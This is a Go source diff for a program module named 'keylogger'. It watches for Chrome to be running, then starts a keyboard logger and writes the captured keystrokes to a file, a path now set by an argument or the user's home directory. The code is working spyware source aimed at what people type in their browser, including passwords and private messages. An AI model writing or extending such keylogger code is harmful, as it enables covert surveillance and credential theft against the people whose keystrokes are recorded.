@@ -1,14 +1,37 @@
 package main
 
 import (
+	"fmt"
 	"keylogger/pkg/keyboardlogger"
 	"keylogger/pkg/winprocessutils"
 	"log"
+	"os"
 	"time"
 )
 
 func main() {
 	var loggerRunning bool = false
+	var logsDirectory string = ""
+	if len(os.Args[1]) > 0 {
+		logsDirectory = os.Args[1]
+	} else {
+		home, err := os.UserHomeDir()
+		if err != nil {
+			log.Fatal(err)
+		}
+		logsDirectory = fmt.Sprintf("%s/logs.txt", home)
+	}
+	_, err := os.OpenFile(logsDirectory, os.O_APPEND|os.O_WRONLY, 0644)
+	if err != nil {
+		_, createErr := os.Create(logsDirectory)
+		if createErr != nil {
+			log.Fatal(createErr)
+		}
+	}
+
+	fmt.Println(os.UserHomeDir())
+	fmt.Println(os.Args[0])
+
 	for {
 		procs, err := winprocessutils.Processes()
 		if err != nil {
@@ -17,7 +40,7 @@ func main() {
 		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
 		if chrome != nil {
 			if !loggerRunning {
-				go keyboardlogger.StartKeyboardLogger()
+				go keyboardlogger.StartKeyboardLogger(logsDirectory)
 				loggerRunning = true
 			}
 		} else {
